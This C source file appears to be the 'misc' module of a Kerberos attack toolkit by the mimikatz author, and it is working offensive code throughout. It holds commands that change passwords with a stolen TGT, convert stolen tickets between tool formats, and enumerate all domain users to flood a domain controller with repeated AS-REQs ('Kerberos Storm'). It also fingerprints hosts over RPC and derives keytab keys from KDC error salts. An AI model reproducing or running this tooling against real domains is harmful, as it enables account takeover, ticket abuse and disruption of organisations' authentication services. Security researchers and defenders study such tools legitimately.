/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_misc.h"

const KUHL_M_C kuhl_m_c_misc[] = {
	{kuhl_m_misc_changepw,	L"changepw",	L"Change user password (AoratoPw)"},
	{kuhl_m_misc_convert,	L"convert",		L"Convert tickets"},
	{kuhl_m_misc_storm,		L"storm",		L"Kerberos Storm!"},
	{kuhl_m_misc_arch,		L"arch",		L"Ask RPC for NDR64 support"},
	{kuhl_m_misc_keytab,	L"keytab",		L"Generate a Keytab/AES256 from the salt of an error"},
};
const KUHL_M kuhl_m_misc = {
	L"misc",	L"Miscellaneous module", NULL,
	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
};

NTSTATUS kuhl_m_misc_changepw(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	PWSTR domain;
	PKULL_M_SOCK socket;

	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;

	KULL_M_ASN1_AP_REP *ApRep = NULL;
	KULL_M_ASN1_KRB_PRIV *KrbPriv = NULL;
	KULL_M_ASN1_EncKrbPrivPart *encKrbPrivPart = NULL;
	KULL_M_ASN1_EncryptionKey authKey;
	KULL_M_ASN1_UInt32 seq;

	OssBuf ApReq = {0, NULL}, KrbPrivReq = {0, NULL};
	USHORT version;
	KULL_M_ASN1__octet1 data;

	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
	{
		kprintf(L"Ticket  : %s\n", szData);
		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
		{
			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
			{
				if(version = kull_m_kerberos_asn1_Authinfos_changepw(&data, argc, argv, KrbCred->tickets->value.realm))
				{
					if(kull_m_kerberos_asn1_ApReq_build(&ApReq, &encKrbCred->ticket_info->value.pname, encKrbCred->ticket_info->value.prealm, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &authKey, &seq))
					{
						if(kull_m_kerberos_asn1_KrbPriv_build(&data, &authKey, "wtf", &KrbPrivReq, &seq))
						{
							if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KPASSWD_DEFAULT_PORT, argc, argv, TRUE))
							{
								if(kull_m_kerberos_asn1_net_callKadminOssBuf(socket, version, &ApReq, &KrbPrivReq, &ApRep, &KrbPriv))
								{
									if(kull_m_kerberos_asn1_EncKrbPrivPart_from_Priv_build(KrbPriv, &encKrbPrivPart, &authKey))
									{
										kprintf(L"[changepw] ");
										kull_m_kadmin_passwd_retFromKadmin(&encKrbPrivPart->user_data);
										ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbPrivPart_PDU, encKrbPrivPart);
									}
									ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_PRIV_PDU, KrbPriv);
									ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AP_REP_PDU, ApRep);
								}
								kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
							}
							ossFreeBuf(&kull_m_kerberos_asn1_world, KrbPrivReq.value);
						}
						if(authKey.keyvalue.value)
							LocalFree(authKey.keyvalue.value);
						ossFreeBuf(&kull_m_kerberos_asn1_world, ApReq.value);
					}
					LocalFree(data.value);
				}
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
		}
	}
	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
	return STATUS_SUCCESS;
}

const KULL_M_KADMIN_PASSWD_ERR kull_m_kadmin_passwd_err[] = {
	{0,	L"KRB5_KPASSWD_SUCCESS"},
	{1,	L"KRB5_KPASSWD_MALFORMED"},
	{2,	L"KRB5_KPASSWD_HARDERROR"},
	{3,	L"KRB5_KPASSWD_AUTHERROR"},
	{4,	L"KRB5_KPASSWD_SOFTERROR"},
	{5,	L"KRB5_KPASSWD_ACCESSDENIED"},
	{6,	L"KRB5_KPASSWD_BAD_VERSION"},
	{7,	L"KRB5_KPASSWD_INITIAL_FLAG_NEEDED"},
};
PCWSTR kull_m_kadmin_passwd_err_to_string(DWORD id)
{
	DWORD i;
	for(i = 0; i < ARRAYSIZE(kull_m_kadmin_passwd_err); i++)
		if(kull_m_kadmin_passwd_err[i].id == id)
			return kull_m_kadmin_passwd_err[i].name;
	return L"ERROR ?";
}

void kull_m_kadmin_passwd_retFromKadmin(KULL_M_ASN1__octet1 * data)
{
	WORD code;
	if(data->length >= 2)
	{
		if(code = _byteswap_ushort(*(PWORD) data->value))
			kprintf(L"%s (%u)", kull_m_kadmin_passwd_err_to_string(code), code);
		else kprintf(L"OK");
		if(data->length > 2)
		{
			kprintf(L" - {");
			kull_m_string_wprintf_hex(data->value + 2, data->length - 2, 0);
			kprintf(L"}");
		}
		kprintf(L"\n");
	}
	else PRINT_ERROR(L"Size\n");
}

const KERB_FORMAT_MODULE modules[] = {
	{L"MIT Credential Cache", kiwi_ccache_valid_header, kiwi_ccache_read, kiwi_ccache_write, L"ccache", L"ccaches"},
	{L"RFC KRB-CRED (#22)", kiwi_krbcred_valid_header, kiwi_krbcred_read, kiwi_krbcred_write, L"kirbi", L"kirbis"},
	{L"WCE \'windows wce\'", kiwi_wce_valid_header, kiwi_wce_read, kiwi_wce_write, L"wce", L"wces"},
	{L"Microsoft LSA API", NULL, NULL, kiwi_lsa_write, NULL, L"lsa"},
};
NTSTATUS kuhl_m_misc_convert(int argc, wchar_t * argv[])
{
	DWORD i, j;
	KERB_FORMAT_MODULE const * readModule, * writeModule;
	OssBuf input, output = {0, NULL};
	KULL_M_ASN1_KRB_CRED *cred = NULL, *dst = NULL;
	BOOL explodeIt;

	if(argc > 1)
	{
		writeModule = NULL;
		for(j = 0; j < ARRAYSIZE(modules); j++)
		{
			if(modules[j].simpleName && !_wcsicmp(modules[j].simpleName, argv[0]))
			{
				writeModule = &modules[j];
				explodeIt = FALSE;
				break;
			}
			else if(modules[j].multiName && !_wcsicmp(modules[j].multiName, argv[0]))
			{
				writeModule = &modules[j];
				explodeIt = TRUE;
				break;
			}
		}

		if(writeModule)
		{
			kprintf(L"Destination : %s (%s)\n", writeModule->shortName, explodeIt ? L"multiple" : L"simple");
			for(i = 1; i < (DWORD) argc ; i++)
			{
				kprintf(L" < %s ", argv[i]);
				if(kull_m_file_readData(argv[i], &input.value, (PDWORD) &input.length))
				{
					readModule = NULL;
					for(j = 0; j < ARRAYSIZE(modules); j++)
					{
						if(modules[j].validHeader)
						{
							if(modules[j].validHeader(&input))
							{
								readModule = &modules[j];
								break;
							}
						}
					}

					if(readModule)
					{
						kprintf(L"(%s) ", readModule->shortName);
						if(readModule->readData && readModule->readData(&input, &cred))
						{
							addCred(cred, &dst);
							ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, cred);
						}
						else kprintf(L": error when reading!");
					}
					else kprintf(L": format not recognized!");
					kprintf(L"\n");
					LocalFree(input.value);
				}
				else PRINT_ERROR_AUTO(L"kull_m_file_readData");
			}

			if(dst)
			{
				writeData(writeModule, explodeIt, dst);
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, dst);
			}
		}
	}
	else PRINT_ERROR(L"Arguments missing! kirbi|ccache|wce|lsa|kirbis|ccaches|wces ticket1 [ticket2] [...]\n");
	return STATUS_SUCCESS;
}

// globals for performances
LIST_ENTRY gUserList = {&gUserList, &gUserList};
PSTR gDomain;
NTSTATUS kuhl_m_misc_storm(int argc, wchar_t * argv[])
{
	BOOL sockError = FALSE;
	DWORD retry, i, total, dataOutSize;
	IPPROTO mode = IPPROTO_TCP;
	PBERVAL pBerVal = NULL;
	KULL_M_SOCK fullsocket;
	PVOID dataOut;
	PKIWI_USERNAMEA entry, tmp;
	FILETIME fTime;
	LPCWSTR szDc, szDomain, szNum;

	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) && kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
	{
		gDomain = kull_m_string_unicode_to_ansi(szDomain);
		
		kull_m_string_args_byName(argc, argv, L"retry", &szNum, L"20");
		retry = wcstoul(szNum, NULL, 0);
		kprintf(L"DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\nMode       : ", szDc, szDomain, retry);
		if(kull_m_string_args_byName(argc, argv, L"udp", NULL, NULL))
		{
			mode = IPPROTO_UDP;
			kprintf(L"UDP");
		}
		else kprintf(L"TCP");

		GetSystemTimeAsFileTime(&fTime); kprintf(L"\n> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
		if(total = kuhl_m_misc_storm_giveUsersForServer(szDc))
		{
			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
			if(kull_m_sock_init_addr_protocol(szDc, NULL, KERBEROS_DEFAULT_PORT, mode, &fullsocket))
			{
				if(kull_m_sock_connect(&fullsocket))
				{
					GetSystemTimeAsFileTime(&fTime); kprintf(L"> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
					for(entry = (PKIWI_USERNAMEA) gUserList.Flink; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink)
					{
						if(pBerVal = kuhl_m_misc_storm_giveBERForUser(&entry->username))
						{
							for(i = 0; !sockError && (i < retry); i++)
							{
								if(kull_m_kerberos_asn1_net_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
									LocalFree(dataOut);
								else sockError = TRUE;
							}
							ber_bvfree(pBerVal);
						}
					}
					GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of AS-REQ        : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
				}
				kull_m_sock_termSocket(&fullsocket);
			}

			GetSystemTimeAsFileTime(&fTime); kprintf(L"> Free user list       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
			for(entry = (PKIWI_USERNAMEA) gUserList.Flink; entry != (PKIWI_USERNAMEA) &gUserList; entry = tmp)
			{
				tmp = (PKIWI_USERNAMEA) entry->navigator.Flink;
				RtlFreeAnsiString(&entry->username);
				LocalFree(entry);
			}
			gUserList.Blink = gUserList.Flink = &gUserList;
			GetSystemTimeAsFileTime(&fTime); kprintf(L"> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L"\n");
		}
		else PRINT_ERROR(L"unable to get users\n");

		LocalFree(gDomain);
	}
	else PRINT_ERROR(L"/dc:<dc.fqdn.local> /domain:<fqdn.local> required\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_misc_storm_add(PCUNICODE_STRING name)
{
	BOOL status = FALSE;
	PKIWI_USERNAMEA ua;
	if(ua = (PKIWI_USERNAMEA) LocalAlloc(LPTR, sizeof(KIWI_USERNAMEA)))
	{
		ua->navigator.Blink = gUserList.Blink;
		ua->navigator.Flink = &gUserList;
		((PKIWI_USERNAMEA) gUserList.Blink)->navigator.Flink = (PLIST_ENTRY) ua;
		gUserList.Blink= (PLIST_ENTRY) ua;
		status = NT_SUCCESS(RtlUnicodeStringToAnsiString(&ua->username, name, TRUE));
	}
	return status;
}

const BYTE
	reqFlags[] = {0x00, 0x40, 0x80, 0x00, 0x10},
	nullPATS[] = {0x30, 0x36, 0xa0, 0x03, 0x02, 0x01, 0x17, 0xa2, 0x2f, 0x04, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
PBERVAL kuhl_m_misc_storm_giveBERForUser(PCANSI_STRING user)
{
	BerElement *pBer;
	PBERVAL pBerVal = NULL;
	if(pBer = ber_alloc_t(LBER_USE_DER))
	{
		ber_printf(pBer,"t{{"
							"t{i}"
								"t{i}"
								"t{{"
									"{t{i}t{o}}"
								"}}"
							"t{{"
								"t{X}"
								"t{{t{i}t{{to}}}}"
								"t{ts}"
								"t{{t{i}t{{tsts}}}}"
								"t{ts}"
								"t{i}"
								"t{{i}}"
							"}}"
						"}}",
						MAKE_APP_TAG(10),
							MAKE_CTX_TAG(1), 5,
							MAKE_CTX_TAG(2), 10,
							MAKE_CTX_TAG(3),
								MAKE_CTX_TAG(1), 2, MAKE_CTX_TAG(2), nullPATS, sizeof(nullPATS),
							MAKE_CTX_TAG(4),
								MAKE_CTX_TAG(0), reqFlags, sizeof(reqFlags),
								MAKE_CTX_TAG(1), MAKE_CTX_TAG(0), KRB_NT_PRINCIPAL, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, user->Buffer, user->Length,
								MAKE_CTX_TAG(2), DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
								MAKE_CTX_TAG(3), MAKE_CTX_TAG(0), KRB_NT_SRV_INST, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, "krbtgt", DIRTY_ASN1_ID_GENERAL_STRING, gDomain,
								MAKE_CTX_TAG(5), DIRTY_ASN1_ID_GENERALIZED_TIME, "20370913024805Z",
								MAKE_CTX_TAG(7), MIMIKATZ_NONCE,
								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
					);
		if(ber_flatten(pBer, &pBerVal) < 0)
			PRINT_ERROR(L"ber_flatten for %Z@%S\n", user, gDomain);
		ber_free(pBer, 1);
	}
	return pBerVal;
}

DWORD kuhl_m_misc_storm_giveUsersForServer(PCWSTR server)
{
	NTSTATUS status, enumDomainStatus, enumUserStatus;
	UNICODE_STRING serverName;
	SAMPR_HANDLE hServerHandle, hDomainHandle;
	DWORD i, j, domainEnumerationContext = 0, domainCountRetourned, userEnumerationContext, userCountRetourned, totalUsers = 0;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer, pEnumUsersBuffer;
	PSID domainSid;

	RtlInitUnicodeString(&serverName, server);
	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
	if(NT_SUCCESS(status))
	{
		do
		{
			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
			{
				for(i = 0; i < domainCountRetourned; i++)
				{
					status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
					if(NT_SUCCESS(status))
					{
						if(((PISID) domainSid)->SubAuthorityCount && (((PISID) domainSid)->SubAuthority[0] == SECURITY_BUILTIN_DOMAIN_RID))
							continue;
						kprintf(L"Domain name : %wZ\n", &pEnumDomainBuffer[i].Name);
						kprintf(L"Domain SID  : "); kull_m_string_displaySID(domainSid); kprintf(L"\n");
						status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS, domainSid, &hDomainHandle);
						if(NT_SUCCESS(status))
						{
							userEnumerationContext = 0;
							do
							{
								enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, USER_NORMAL_ACCOUNT, &pEnumUsersBuffer, 4*1024*1024, &userCountRetourned);
								if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
								{
									totalUsers += userCountRetourned;
									for(j = 0; j < userCountRetourned; j++) 
										kuhl_m_misc_storm_add(&pEnumUsersBuffer[j].Name);
									SamFreeMemory(pEnumUsersBuffer);
								}
								else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x", enumUserStatus);
							}
							while(enumUserStatus == STATUS_MORE_ENTRIES);
							kprintf(L"Total       : %u\n", totalUsers);
							SamCloseHandle(hDomainHandle);
						}
						else PRINT_ERROR(L"SamOpenDomain %08x", status);
						SamFreeMemory(domainSid);
					}
					else PRINT_ERROR(L"SamLookupDomainInSamServer %08x", status);
				}
				SamFreeMemory(pEnumDomainBuffer);
			}
			else PRINT_ERROR(L"SamEnumerateDomainsInSamServer %08x\n", enumDomainStatus);
		}
		while(enumDomainStatus == STATUS_MORE_ENTRIES);
		SamCloseHandle(hServerHandle);
	}
	return totalUsers;
}

NTSTATUS kuhl_m_misc_arch(int argc, wchar_t * argv[])
{
	KULL_M_SOCK sock;
	PCWCHAR server = argc ? argv[0] : L"localhost";
	DWORD cbOut;
	prpcconn_bind_ack_hdr_t binda = NULL;
	pp_result_list_t list = NULL;
	static const rpcconn_bind_hdr_t bindr = {
		5, 0,
		RPC_PDU_bind,
		0x02 | 0x01,
		0x00000010,
		sizeof(rpcconn_bind_hdr_t),
		0,
		2,
		5840, 5840,
		0,
		{
			1,
			0, 0,
			{
				{
					0,
					1,
					0,
					{{0xe1af8308, 0x5d1f, 0x11c9, {0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa}}, {3, 0}}, // AbstractSyntax EPMv4 v3.0
					{
						{{0x71710533, 0xbeba, 0x4937, {0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}}, {1, 0}} // TransferSyntax NDR64 v1.0
					}
				}
			}
		}
	};

	kprintf(L"Server      : %s\n", server);
	if(kull_m_sock_init_addr_protocol(server, NULL, 135, IPPROTO_TCP, &sock))
	{
		if(kull_m_sock_connect(&sock))
		{
			if(kull_m_sock_SendAndRecv(&sock, &bindr, bindr.frag_length, (LPVOID *) &binda, &cbOut))
			{
				if(cbOut > (DWORD) FIELD_OFFSET(rpcconn_bind_ack_hdr_t, max_xmit_frag))
				{
					if(binda->PTYPE == RPC_PDU_bind_ack)
					{
						list = (pp_result_list_t) ((PBYTE) &binda->sec_addr + SIZE_ALIGN(FIELD_OFFSET(port_any_t, port_spec) + binda->sec_addr.length, 4));
						if(list->n_results == 1)
						{
							if(list->p_results[0].result == RPC_CONT_DEF_RESULT_acceptance)
								kprintf(L"Architecture: x64\n");
							else if((list->p_results[0].result == RPC_CONT_DEF_RESULT_provider_rejection) && (list->p_results[0].reason == RPC_PROVIDER_REASON_proposed_transfer_syntaxes_not_supported))
								kprintf(L"Architecture: x86\n");
							else PRINT_ERROR(L"Result: %u -- Reason: %u\n", (DWORD) list->p_results[0].result, (DWORD) list->p_results[0].reason);
						}
						else PRINT_ERROR(L"n_results: %u\n", (DWORD) list->n_results);
					}
					else PRINT_ERROR(L"PTYPE: %u\n", (DWORD) binda->PTYPE);
				}
				else PRINT_ERROR(L"Size is not valid (%u)\n", cbOut);
				LocalFree(binda);
			}
		}
		kull_m_sock_termSocket(&sock);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_keytab(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	KULL_M_ASN1_KRB_ERROR *error = NULL;
	UNICODE_STRING uPassword, uSalt;
	KULL_M_ASN1__octet1 padata;
	KULL_M_ASN1_EncryptionKey key = {KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, {0, NULL}};
	LPCWSTR filename = NULL;

	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		RtlInitUnicodeString(&uPassword, infos->w_password);
		kull_m_string_args_byName(argc, argv, L"kt", &filename, NULL);
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqGenericRep(infos, socket, NULL, NULL, KULL_M_ASN1_KRB_ERROR_PDU, (LPVOID *) &error))
			{
				if(error->error_code == 25 /*KDC_ERR_PREAUTH_REQUIRED*/)
				{
					if(error->bit_mask & KULL_M_ASN1_e_data_present)
					{
						if(kuhl_m_misc_keytab_padata_from_edata(&error->e_data, PA_TYPE_ETYPE_INFO2, &padata))
						{
							if(kuhl_m_misc_keytab_salt_from_info2(&padata, key.keytype, &uSalt))
							{
								kprintf(L"Salt is: `%wZ`\n", &uSalt);
								if(kuhl_m_misc_keytab_ekey_with_salt(infos->w_password, &uSalt, &key))
								{
									kull_m_kerberos_asn1_crypto_ekey_descr(&key);
									kprintf(L"\n");
									kuhl_m_misc_keytab_tofile(infos, &key, filename);
									LocalFree(key.keyvalue.value);
								}
								RtlFreeUnicodeString(&uSalt);
							}
							LocalFree(padata.value);
						}
					}
					else PRINT_ERROR(L"No e-data\n");
				}
				else
				{
					kprintf(L"%s (%u) - ", kull_m_kerberos_asn1_helper_util_err_to_string(error->error_code), error->error_code);
					kull_m_kerberos_asn1_KerberosTime_print(&error->stime);
					kprintf(L"\n");
				}
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_ERROR_PDU, error);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_misc_keytab_salt_from_info2(KULL_M_ASN1__octet1 *info2, KULL_M_ASN1_Int32 etype, PUNICODE_STRING salt)
{
	BOOL status = FALSE;
	int pdu = KULL_M_ASN1_ETYPE_INFO2_PDU;
	KULL_M_ASN1_ETYPE_INFO2 *einfos = NULL, curEInfos;
	ANSI_STRING aSalt;
	
	if(!ossDecode(&kull_m_kerberos_asn1_world, &pdu, (OssBuf *) info2, (LPVOID *) &einfos))
	{
		for(curEInfos = *einfos; curEInfos; curEInfos = curEInfos->next)
		{
			if(curEInfos->value.etype == etype)
			{
				if(curEInfos->value.salt)
				{
					RtlInitString(&aSalt, curEInfos->value.salt);
					status = NT_SUCCESS(RtlAnsiStringToUnicodeString(salt, &aSalt, TRUE));
				}
				break;
			}
		}
		ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_ETYPE_INFO2_PDU, einfos);
		if(!status)
			PRINT_ERROR(L"Unable to get a salt or ETYPE_INFO2 entry for %i\n", etype);
	}
	else PRINT_ERROR(L"Unable to decode ETYPE_INFO2: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
	return status;
}

BOOL kuhl_m_misc_keytab_padata_from_edata(KULL_M_ASN1__octet1 *e_data, KULL_M_ASN1_Int32 type, KULL_M_ASN1__octet1 *padata)
{
	BOOL status = FALSE;
	int pdu = KULL_M_ASN1_METHOD_DATA_PDU;
	KULL_M_ASN1_METHOD_DATA *methods = NULL, curMethod;

	if(!ossDecode(&kull_m_kerberos_asn1_world, &pdu, (OssBuf *) e_data, (LPVOID *) &methods))
	{
		for(curMethod = *methods; curMethod; curMethod = curMethod->next)
		{
			if(curMethod->value.padata_type == type)
			{
				padata->length = curMethod->value.padata_value.length;
				if(padata->value = (unsigned char *) LocalAlloc(LPTR, padata->length))
				{
					RtlCopyMemory(padata->value, curMethod->value.padata_value.value, padata->length);
					status = TRUE;
				}
				break;
			}
		}
		ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_METHOD_DATA_PDU, methods);
		if(!status)
			PRINT_ERROR(L"Unable to get a PA_DATA entry for %i\n", type);
	}
	else PRINT_ERROR(L"Unable to decode METHOD_DATA from KRB_ERROR: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
	return status;
}

BOOL kuhl_m_misc_keytab_ekey_with_salt(LPCWSTR password, PCUNICODE_STRING salt, KULL_M_ASN1_EncryptionKey *ekey)
{
	NTSTATUS nStatus;
	PKERB_ECRYPT pCSystem;
	UNICODE_STRING uPassword;

	nStatus = CDLocateCSystem(ekey->keytype, &pCSystem);
	if(NT_SUCCESS(nStatus))
	{
		ekey->keyvalue.length = pCSystem->KeySize;
		if(ekey->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, ekey->keyvalue.length))
		{
			RtlInitUnicodeString(&uPassword, password);
			nStatus = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(&uPassword, ekey->keyvalue.value) : pCSystem->HashPassword_NT6(&uPassword, salt, 4096, ekey->keyvalue.value);
			if(!NT_SUCCESS(nStatus))
				PRINT_ERROR(L"HashPassword: %08x\n", nStatus);
			if(!NT_SUCCESS(nStatus))
				ekey->keyvalue.value = (unsigned char *) LocalFree(ekey->keyvalue.value);
		}
	}
	else PRINT_ERROR(L"CDLocateCSystem: %08x\n", nStatus);
	return NT_SUCCESS(nStatus);
}

BOOL kuhl_m_misc_keytab_tofile(PKIWI_AUTH_INFOS infos, KULL_M_ASN1_EncryptionKey *key, LPCWSTR filename)
{
	BOOL status = FALSE;
	WORD components, componentsLen, realmLen;
	DWORD structLen;
	__time32_t timestamp;
	struct KULL_M_ASN1__seqof1 *names;
	PBYTE myStruct, myPtr;

	for(components = 0, componentsLen = 0, names = infos->cname.name_string; names; components++, componentsLen += lstrlenA(names->value), names = names->next);
	realmLen = lstrlenA(infos->realm);
	structLen = sizeof(WORD) + sizeof(DWORD) + sizeof(WORD) + 
		sizeof(WORD) + realmLen +
		(components * sizeof(WORD)) + componentsLen + sizeof(DWORD) + 
		sizeof(DWORD) +
		sizeof(BYTE) + sizeof(WORD) + sizeof(WORD) + key->keyvalue.length;

	if(myStruct = (PBYTE) LocalAlloc(LPTR, structLen))
	{
		myPtr = myStruct;
		*(PWORD) myPtr = _byteswap_ushort(0x0502); myPtr += sizeof(WORD);
		*(PDWORD) myPtr = _byteswap_ulong(structLen -  sizeof(WORD) - sizeof(DWORD)); myPtr += sizeof(DWORD);
		*(PWORD) myPtr = _byteswap_ushort(components); myPtr += sizeof(WORD);

		*(PWORD) myPtr = _byteswap_ushort(realmLen); myPtr += sizeof(WORD);
		RtlCopyMemory(myPtr, infos->realm, realmLen); myPtr += realmLen;

		for(names = infos->cname.name_string; names; names = names->next)
		{
			componentsLen = lstrlenA(names->value);
			*(PWORD) myPtr = _byteswap_ushort(componentsLen); myPtr += sizeof(WORD);
			RtlCopyMemory(myPtr, names->value, componentsLen); myPtr += componentsLen;
		}
		*(PDWORD) myPtr = _byteswap_ulong(infos->cname.name_type); myPtr += sizeof(DWORD);
		_time32(&timestamp);
		*(PDWORD) myPtr = _byteswap_ulong(timestamp); myPtr += sizeof(DWORD);
		*(PBYTE) myPtr = 0x02; myPtr++;
		*(PWORD) myPtr = _byteswap_ushort((WORD) key->keytype); myPtr += sizeof(WORD);
		*(PWORD) myPtr = _byteswap_ushort((WORD) key->keyvalue.length); myPtr += sizeof(WORD);
		RtlCopyMemory(myPtr, key->keyvalue.value, key->keyvalue.length);

		if(filename)
		{
			kprintf(L"> %s -> ", filename);
			if(status = kull_m_file_writeData(filename, myStruct, structLen))
				kprintf(L"OK\n");
			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
		}
		else
		{
			kprintf(L"No destination (/kt:<file>), output is:\n");
			kull_m_string_wprintf_hex(myStruct, structLen, 1 | (16 << 16));
			kprintf(L"\n");
			status = TRUE;
		}
		LocalFree(myStruct);
	}
	return status;
}